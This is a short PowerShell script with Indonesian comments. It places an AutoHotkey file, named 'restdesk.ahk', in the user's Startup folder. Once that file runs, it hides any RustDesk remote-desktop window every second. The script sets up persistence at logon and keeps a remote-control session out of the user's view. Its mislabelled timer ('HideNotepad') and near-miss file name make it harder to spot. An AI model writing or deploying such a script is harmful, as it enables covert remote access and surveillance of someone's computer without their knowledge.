# Dapatkan path folder Startup user saat ini
$startupFolder = [Environment]::GetFolderPath("Startup")

# Nama dan isi file
$fileName = "restdesk.ahk"
$fileContent = @"
#Persistent
SetTimer, HideNotepad, 1000  ; Cek setiap 1 detik
return

HideNotepad:
If WinExist("ahk_exe rustdesk.exe") {
    WinHide, ahk_exe rustdesk.exe
}
return
"@

# Gabungkan path dan nama file
$filePath = Join-Path $startupFolder $fileName

# Tulis file
Set-Content -Path $filePath -Value $fileContent -Encoding UTF8

# Tampilkan konfirmasi
Write-Output "File '$fileName' berhasil dibuat di folder Startup: $filePath"
